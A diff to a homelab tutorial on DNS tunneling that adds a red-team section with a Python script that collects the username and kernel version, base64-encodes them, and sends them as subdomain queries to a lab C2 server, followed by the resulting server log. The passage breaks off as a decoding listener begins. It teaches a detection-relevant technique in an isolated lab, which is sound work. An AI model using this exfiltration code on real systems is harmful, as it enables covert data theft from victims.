@@ -108,6 +108,19 @@ nameserver 192.168.1.155 # Change this to the IP of your DNS server
 This simulates real-world DNS connection. In doing this you can keep it isolated to your private network, allowing the infected machine to treat your server as its own DNS - enabling IP resolution. In real-world scenarios this wouldn't be required because the domain would be recognised by a public DNS provider.
 
 # Red Team
+With configuration finished the red team engagement can commence. For this part we assume that the adversary has already managed to get malware onto the victim's machine, and it is now infected. This malware was created specifically for this lab, is written in Python, and is provided in the next code block.
+
+I've named this malware `dns_tunneling.py` and its sole purpose is to extract information from the infected machine and exfiltrate it over DNS to the C2 server. That might sound complicated, but it's quite easy when you break it down into steps:
+
+1. Collect the data using built-in linux commands via subprocess
+2. Encode it with base64 for seamless transportation
+3. Clean the data and strip unnecessary characters
+4. Query the C2 DNS server with the encoded data
+
+Encoding with base64 is required because DNS operates with a strict set of character limitations. This means that certain special characters like spaces, slashes and non-ASCII symbols could break the query entirely. When you encode this data with base64 you're essentially sanitizing the data so that it doesn't interfere with the query's structure.
+
+Please note the DNS toolkit used in this malware is not installed by default. `subprocess` and `base64` will be included with a typical Python install but you will need to install `dnspython` to get the exfiltration section to work. You can do this by running `pip install dnspython`.
+
 ``` python
 def base64_encode(data):
     # base64 encoding requires input data as bytes
@@ -120,17 +133,17 @@ def run_command(commands):
     # process commands and return stdout as bytes
     return subprocess.run(commands, capture_output=True).stdout
 
-# Reconnaissance
+# Extract
 import subprocess
 raw_username = run_command("whoami")
 raw_system_info = run_command(["uname", "-r"])
 
-# Encoding
+# Encode
 import base64
 encoded_username = base64_encode(raw_username)
 encoded_system_info = base64_encode(raw_system_info)
 
-# Exfiltration
+# Exfiltrate
 import dns.resolver
 domain = ".homelab.local"
 encoded_message = f"{encoded_username}.{encoded_system_info}" + domain
@@ -140,12 +153,14 @@ except:
     pass
 ```
 
-When running the script you should get output like below:
+When the script above is run your C2 server should receive a log that looks similar to this:
 ```
 client @0x77042c1ca578 192.168.1.182#55499 (YWxleAo=.Ni4xNC4xMC1hcmNoMS0xCg==.homelab.local): query: YWxleAo=.Ni4xNC4xMC1hcmNoMS0xCg==.homelab.local IN TXT +E(0) (192.168.1.155)
 ```
 
-Now that we've confirmed that works it's time to make a python script on the server to strip out the query and decode it.
+Notice how the query contains two obfuscated strings; `YWxleAo=` and `Ni4xNC4xMC1hcmNoMS0xCg==`. What we've done here is queried `homelab.local` but included the exfiltrated and encoded data as two additional subdomains. In doing this the C2 server has managed to log the query despite the fact that the domain does not exist. This is exactly how we will harness this exfiltration technique - we just need to make a listener that can decode the logs for us.
+
+To do
 ``` python
 import re
 import time
